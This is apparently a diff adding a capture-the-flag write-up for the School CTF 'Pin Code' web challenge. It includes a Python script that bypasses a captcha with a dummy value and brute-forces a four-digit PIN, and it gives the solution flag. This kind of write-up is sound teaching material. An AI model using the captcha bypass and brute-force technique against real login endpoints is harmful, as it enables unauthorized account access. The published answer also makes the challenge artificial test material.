@@ -1,0 +1,91 @@
+This write-up presents the solution for the School CTF challenge
+Pin Code, which is a Web challenge of worth 400 points.
+
+The challenge can be found at: http://pincode.task.school-ctf.org/.
+
+Entering the website, we are prompted to enter the password, which
+consists of four digits (each from 1 to 9). Moreover, there is a
+CAPTCHA protection to protect against bots. The password is entered
+via provided buttons of digits.
+
+Trying to enter a password like 1234, since it's wrong, the
+website changes its background color to red for a second, and reverts
+back to its original color, to tell we entered a wrong password.
+This behavior tells us JavaScript is used to check the input.
+Moreover, if we try to enter the password without passing the
+CAPTCHA challenge, we are asked to first pass that.
+
+Inspecting the source code, we see the following JavaScript code which
+checks the input password:
+
+
+if (input.length >= 4) {
+    var captcha = grecaptcha.getResponse();
+    if (captcha.length > 0) {
+        if (isValid(input)) {
+            $.ajax({
+                type: "POST",
+                url: '/api/check',
+                data: {'key': input, 'captcha': captcha}
+                success: function(data){displayAnswer(data)},
+            });
+        } else {
+            displayAnswer({'body': 'wrong'})
+        }
+    } else {
+        showError("Please pass the CAPTCHA challenge")
+    }
+    resetColors();
+}
+
+
+To understand how website communicates with the server, it is essential 
+to find how the input password is passed. We notice from above code 
+snippet that it is done via a POST request to the URL /api/check, with
+two fields: data and captcha. In case of success, the website shows
+the answer; otherwise it displays {'body': 'wrong'}.
+
+At this point, it is essential to observe how CAPTCHA works to prepare
+a brute-force attack for the password, which has only 8889 candidates
+(9999 - 1111 + 1). If we can find a vulnerability to by-pass CAPTCHA,
+then we can go ahead with the brute-force attack. Notice that the code
+snippet above passes the CAPTCHA field in the POST data, if captcha has
+length greater than 0. Apparently, if we pass any data in the captcha
+field of the POST request, we will by-pass CAPTCHA.
+
+Moving forward with this motivation, and using Python's Requests API, we
+can write the following code to brute-force the password:
+
+
+import sys, requests
+
+start = int(sys.argv[1])
+
+for i in range(start, start+2000):
+    pd = {'key': str(i), 'captcha': 'aaa'}
+    r = requests.post('http://pincode.task.school-ctf.org/api/check',data=pd)
+    print i, r.text
+    if r.text != "{\"body\":\"wrong\"}": break
+
+
+Running this script 5 times in a parallel manner like:
+
+
+$ python schoolctf_pincode.py 1111
+$ python schoolctf_pincode.py 3111
+$ python schoolctf_pincode.py 5111
+$ python schoolctf_pincode.py 7111
+$ python schoolctf_pincode.py 9111
+
+
+We get a pretty fast brute-forcer for the challenge. After some reasonable
+time, the script gives the password 6444, which prints out the response:
+
+{"body":"/flag/uneverguessme/#SchoolCTF{n0_6rut3f0rc3_0n_CTF//mkey?}"}
+
+Visiting the website via a browser, we verify that the password is correct,
+and the flag lies at the URL: 
+
+http://pincode.task.school-ctf.org/flag/uneverguessme/#SchoolCTF{n0_6rut3f0rc3_0n_CTF//mkey?}
+
+So, the flag is: SchoolCTF{n0_6rut3f0rc3_0n_CTF//mkey?}
